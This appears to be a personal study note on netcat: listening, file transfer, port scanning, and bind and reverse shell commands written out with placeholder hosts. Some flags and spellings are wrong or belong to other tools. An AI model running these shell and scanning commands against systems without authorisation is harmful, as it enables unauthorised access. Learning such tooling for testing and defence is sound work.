## Netcat

Netcat is an all in one network tool but at the latter is where you will sound most of your time with Netcat. 

##### Setup Listening

	nc -nnvp <port you want to listen on>

-e is huge and will allow a bash shell: you can set up: 

	nc -lvnp <portnumber> -e /bin/bash

Connecting to a Listener

	nc <ipaddress> <port number>

##### Sending Files

From listener 
	nc -lvnp > myfile3 (listening side)

to listener

	nc <target ip address> < myfile


##### Setting up a Bind Shell

Listening on remote computer 

	nc -lnvp 4444 -e cmd

Open session on local computer  

	nc -nv <IP> 4444


##### Reverse Bind Shell

Set up listening on local computer 

	nc -lvnp 4444

remote computer sends a reverse shell by 

	nc -vn <listning IP> 4444 -e /bin/bash

##### Securing Netcat

	nc -lvp 444 -e /bin/bash --allow <onlyoneip> --ssl

##### Port Scanning

Full handshake scan

	nc -nvv -w 1 -z <target ip> <port range>

UDP Scan
UDP scan not requiring a handshake. NOTE STELTH scans are no longer hidden from firewalls.  the -u tells nc to use UDP

	nc -unvv -w 1 -z <target ip> <port range>

Its important to note that UPD scanning can lead to false positives because a firewall may drop the packet. 

Return to [[-README]]
